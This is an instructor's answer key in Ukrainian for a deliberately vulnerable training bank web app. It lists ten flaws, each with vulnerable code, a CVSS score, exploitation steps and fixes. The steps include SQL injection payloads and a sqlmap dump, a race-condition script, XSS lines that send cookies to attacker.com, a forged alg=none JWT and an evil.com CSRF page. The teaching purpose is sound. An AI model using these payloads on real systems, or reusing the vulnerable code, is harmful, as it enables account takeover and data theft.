# 🐛 Детальний опис вразливостей

## Для викладачів: Повний список з рішеннями

---

## 1. SQL Injection в Login Form

### Деталі
- **Локація:** `POST /login`
- **Параметри:** `username`, `password`
- **CWE:** CWE-89: SQL Injection
- **CVSS 3.1:** 9.8 (Critical)
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### Вразливий код
```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)
```

### Exploitation

**Bypass Authentication:**
```
Username: admin' OR '1'='1' --
Password: anything
```

**Extract data:**
```bash
sqlmap -u "http://localhost:5000/login" \
  --data "username=test&password=test" \
  --dump -T users
```

**Union-based injection:**
```
Username: ' UNION SELECT 1,2,3,4,'admin','12345',7,8,9,10 --
Password: anything
```

### Impact
- Повний bypass authentication
- Витягнення всіх даних з бази даних
- Можливість remote code execution через `INTO OUTFILE`
- Компроміс усієї системи

### Remediation
```python
# Правильний код
query = "SELECT * FROM users WHERE username=%s AND password=%s"
cursor.execute(query, (username, password))
```

**Додаткові міри:**
- Використовувати ORM (SQLAlchemy)
- Input validation та sanitization
- Principle of least privilege для DB user
- Web Application Firewall (WAF)

---

## 2. Race Condition у Fund Transfer

### Деталі
- **Локація:** `POST /transfer`
- **CWE:** CWE-362: Concurrent Execution using Shared Resource
- **CVSS 3.1:** 9.1 (Critical)
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H

### Вразливий код
```python
# Немає transaction locking!
cursor.execute(f"UPDATE users SET balance = balance - {amount} WHERE account_number = '{from_account}'")
cursor.execute(f"UPDATE users SET balance = balance + {amount} WHERE account_number = '{to_account}'")
conn.commit()
```

### Exploitation
```python
import requests
import threading

def exploit():
    s = requests.Session()
    s.post('http://localhost:5000/login',
           data={'username': 'bob', 'password': 'qwerty'})

    # Bob має $2,500
    # Спробуємо перевести $100 сто разів паралельно

    def transfer():
        s.post('http://localhost:5000/transfer',
               data={'to_account': '1000000003', 'amount': '100'})

    threads = []
    for i in range(100):
        t = threading.Thread(target=transfer)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

exploit()

# Результат: Bob переведе >$2,500 (баланс піде в мінус!)
```

### Impact
- Можливість вивести більше грошей ніж є на рахунку
- Negative balance
- Фінансові втрати для банку
- Порушення цілісності даних

### Remediation
```python
# Правильний код з transaction locking
conn.start_transaction()
try:
    # Lock rows
    cursor.execute("""
        SELECT balance FROM users
        WHERE account_number = %s
        FOR UPDATE
    """, (from_account,))

    balance = cursor.fetchone()[0]

    if balance < amount:
        raise ValueError("Insufficient funds")

    cursor.execute("""
        UPDATE users SET balance = balance - %s
        WHERE account_number = %s
    """, (amount, from_account))

    cursor.execute("""
        UPDATE users SET balance = balance + %s
        WHERE account_number = %s
    """, (amount, to_account))

    conn.commit()
except Exception as e:
    conn.rollback()
    raise
```

---

## 3. IDOR (Insecure Direct Object Reference)

### Деталі
- **Локація:** `GET /account/<account_id>`
- **CWE:** CWE-639: Authorization Bypass Through User-Controlled Key
- **CVSS 3.1:** 7.5 (High)
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

### Вразливий код
```python
@app.route('/account/<int:account_id>')
def view_account(account_id):
    # Немає перевірки прав доступу!
    cursor.execute(f"SELECT * FROM users WHERE id = {account_id}")
    account = cursor.fetchone()
    return jsonify(account)
```

### Exploitation
```bash
# Login як john (user_id=2)
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=john&password=password"

# Переглянути свій акаунт (OK)
curl -b cookies.txt http://localhost:5000/account/2

# Переглянути чужий акаунт (має бути заборонено, але працює!)
curl -b cookies.txt http://localhost:5000/account/1  # admin
curl -b cookies.txt http://localhost:5000/account/3  # alice

# Burp Intruder для enumeration
# GET /account/§1§  (від 1 до 1000)
```

### Impact
- Доступ до чужих особистих даних
- Витік SSN, email, balance
- GDPR порушення
- Порушення конфіденційності

### Remediation
```python
@app.route('/account/<int:account_id>')
def view_account(account_id):
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    # Перевірка прав доступу
    if session['user_id'] != account_id and session['role'] != 'admin':
        return jsonify({'error': 'Forbidden'}), 403

    cursor.execute("SELECT * FROM users WHERE id = %s", (account_id,))
    account = cursor.fetchone()
    return jsonify(account)
```

---

## 4. Reflected XSS

### Деталі
- **Локація:** `GET /search?q=`
- **CWE:** CWE-79: Cross-site Scripting (XSS)
- **CVSS 3.1:** 6.1 (Medium)
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

### Вразливий код
```python
@app.route('/search')
def search():
    query = request.args.get('q', '')
    # Немає sanitization!
    return f"<h1>Search results for: {query}</h1>"
```

### Exploitation
```javascript
// Basic XSS
http://localhost:5000/search?q=<script>alert(1)</script>

// Cookie stealing
http://localhost:5000/search?q=<script>
fetch('http://attacker.com/steal?c=' + document.cookie)
</script>

// Session hijacking
http://localhost:5000/search?q=<script>
var s = document.cookie;
window.location = 'http://attacker.com/steal?session=' + s;
</script>
```

### Impact
- Session hijacking
- Cookie theft
- Malware distribution
- Phishing attacks

### Remediation
```python
from flask import escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # Sanitize input
    safe_query = escape(query)
    return f"<h1>Search results for: {safe_query}</h1>"
```

**Або краще - використовувати templating:**
```python
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return render_template('search.html', query=query)
```

```html
<!-- search.html - Jinja2 автоматично escapes -->
<h1>Search results for: {{ query }}</h1>
```

---

## 5. Missing Authorization у Admin Endpoint

### Деталі
- **Локація:** `GET /admin/users`
- **CWE:** CWE-862: Missing Authorization
- **CVSS 3.1:** 8.2 (High)
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N

### Вразливий код
```python
@app.route('/admin/users')
def admin_users():
    # Перевіряє чи користувач залогінений, але НЕ перевіряє роль!
    if 'user_id' not in session:
        return redirect(url_for('login'))

    cursor.execute("SELECT * FROM users")
    users = cursor.fetchall()
    return jsonify(users)
```

### Exploitation
```bash
# Login як звичайний користувач (john)
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=john&password=password"

# Доступ до admin endpoint (має бути заборонено!)
curl -b cookies.txt http://localhost:5000/admin/users

# Отримаємо всіх користувачів з паролями та SSN!
```

### Impact
- Витік всіх користувацьких даних
- Доступ до паролів (plain text!)
- SSN disclosure
- GDPR/CCPA порушення

### Remediation
```python
from functools import wraps

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'error': 'Unauthorized'}), 401
        if session.get('role') != 'admin':
            return jsonify({'error': 'Forbidden - Admin access required'}), 403
        return f(*args, **kwargs)
    return decorated_function

@app.route('/admin/users')
@admin_required
def admin_users():
    cursor.execute("SELECT id, username, email, account_number, balance FROM users")
    # НЕ повертати passwords та SSN!
    users = cursor.fetchall()
    return jsonify(users)
```

---

## 6. Weak JWT Implementation

### Деталі
- **Локація:** `GET /api/token`
- **CWE:** CWE-327: Use of a Broken or Risky Cryptographic Algorithm
- **CVSS 3.1:** 7.5 (High)

### Вразливий код
```python
app.secret_key = 'super_secret_key_123'  # Weak secret!

token = jwt.encode(payload, app.secret_key, algorithm='HS256')
```

### Exploitation

**1. Brute-force JWT secret:**
```bash
# Використати hashcat
hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# Або JWT Cracker
python jwt-cracker.py -jwt <token> -w rockyou.txt
```

**2. Algorithm confusion (alg=none):**
```python
import jwt
import base64
import json

# Original token
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJyb2xlIjoidXNlciJ9.xxx"

# Decode
header, payload, signature = token.split('.')

# Modify header to use "none" algorithm
new_header = {"alg": "none", "typ": "JWT"}
new_payload = {"user_id": 2, "role": "admin"}  # Change role!

# Encode
new_token = (
    base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=') + '.' +
    base64.urlsafe_b64encode(json.dumps(new_payload).encode()).decode().rstrip('=') + '.'
)

print(new_token)
```

### Impact
- Privilege escalation
- Account takeover
- Bypass authentication

### Remediation
```python
import secrets

# Генерувати strong secret
app.secret_key = secrets.token_hex(32)

# Або з environment variable
app.secret_key = os.environ.get('SECRET_KEY')

# Whitelist allowed algorithms
jwt.decode(token, secret_key, algorithms=["HS256"])

# Додати expiration time
payload = {
    'user_id': user_id,
    'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=30)
}
```

---

## 7. CSRF у Change Password

### Деталі
- **Локація:** `POST /change_password`
- **CWE:** CWE-352: Cross-Site Request Forgery
- **CVSS 3.1:** 6.5 (Medium)

### Вразливий код
```python
@app.route('/change_password', methods=['POST'])
def change_password():
    # Немає CSRF token!
    new_password = request.form.get('new_password')
    cursor.execute(f"UPDATE users SET password = '{new_password}' WHERE id = {session['user_id']}")
```

### Exploitation
```html
<!-- Attacker's website: evil.com -->
<html>
<body>
<h1>You won a prize! Click here!</h1>
<form id="csrf" action="http://localhost:5000/change_password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
</form>
<script>
  document.getElementById('csrf').submit();
</script>
</body>
</html>
```

Якщо жертва відвідає evil.com будучи залогіненою в банк - пароль зміниться!

### Impact
- Account takeover
- Unauthorized actions
- Password change

### Remediation
```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.route('/change_password', methods=['POST'])
@csrf.protect()  # CSRF protection
def change_password():
    new_password = request.form.get('new_password')
    # Також перевірити current password!
    current_password = request.form.get('current_password')
    # ...
```

**Frontend:**
```html
<form method="POST">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  <input type="password" name="current_password">
  <input type="password" name="new_password">
  <button type="submit">Change Password</button>
</form>
```

---

## 8. Information Disclosure

### Деталі
- **Локація:** `GET /debug/env`
- **CWE:** CWE-200: Information Exposure
- **CVSS 3.1:** 5.3 (Medium)

### Вразливий код
```python
@app.route('/debug/env')
def debug_env():
    return jsonify(dict(os.environ))
```

### Exploitation
```bash
curl http://localhost:5000/debug/env

# Output:
{
  "DB_PASSWORD": "weak_password_123",
  "SECRET_KEY": "super_secret_key_123",
  "JWT_SECRET": "weak_jwt_secret",
  ...
}
```

### Impact
- Database credentials exposure
- Secret keys disclosure
- API keys leak

### Remediation
```python
# Видалити endpoint повністю!
# Або додати authentication + whitelist IP

@app.route('/debug/env')
@admin_required
def debug_env():
    # Фільтрувати sensitive data
    safe_env = {k: v for k, v in os.environ.items()
                if not any(x in k for x in ['PASSWORD', 'SECRET', 'KEY'])}
    return jsonify(safe_env)
```

---

## 9. Insecure Password Storage

### Деталі
- **CWE:** CWE-256: Plaintext Storage of a Password
- **CVSS 3.1:** 9.8 (Critical)

### Проблема
```sql
-- Passwords stored in plain text!
INSERT INTO users (username, password) VALUES ('admin', 'admin123');
```

### Impact
- При витоку бази даних - всі паролі скомпрометовані
- Немає можливості використовувати паролі повторно

### Remediation
```python
from werkzeug.security import generate_password_hash, check_password_hash

# При реєстрації
hashed_password = generate_password_hash('admin123', method='pbkdf2:sha256', salt_length=16)

# При login
if check_password_hash(stored_hash, provided_password):
    # Login successful
```

---

## 10. Client-Side Balance Storage

### Деталі
- **CWE:** CWE-602: Client-Side Enforcement of Server-Side Security
- **CVSS 3.1:** 7.5 (High)

### Вразливий код
```python
session['balance'] = float(user['balance'])  # Зберігається в cookie!
```

### Exploitation
```python
# Modify session cookie to increase balance
# Flask session cookies are signed but not encrypted!
```

### Impact
- Balance manipulation
- Financial fraud

### Remediation
```python
# НЕ зберігати sensitive data в session
# Завжди читати з бази даних

@app.route('/dashboard')
def dashboard():
    # Read balance from DB, не з session!
    cursor.execute("SELECT balance FROM users WHERE id = %s", (session['user_id'],))
    balance = cursor.fetchone()[0]
    return render_template('dashboard.html', balance=balance)
```

---

## Загальні рекомендації

### Secure Development Lifecycle
1. **Security by Design** - думати про безпеку з початку
2. **Code Review** - peer review всього коду
3. **Static Analysis** - Bandit, pylint
4. **Dependency Scanning** - Snyk, Safety
5. **Penetration Testing** - регулярні пентести
6. **Bug Bounty** - програма винагород

### Defense in Depth
- Input validation
- Output encoding
- Authentication
- Authorization
- Encryption (TLS, at rest)
- Logging & Monitoring
- WAF (Web Application Firewall)
- Rate limiting
- CAPTCHA

### Compliance
- **PCI DSS** - для обробки карток
- **GDPR** - для EU даних
- **НБУ regulations** - для українських банків
- **OWASP ASVS** - стандарт безпеки додатків
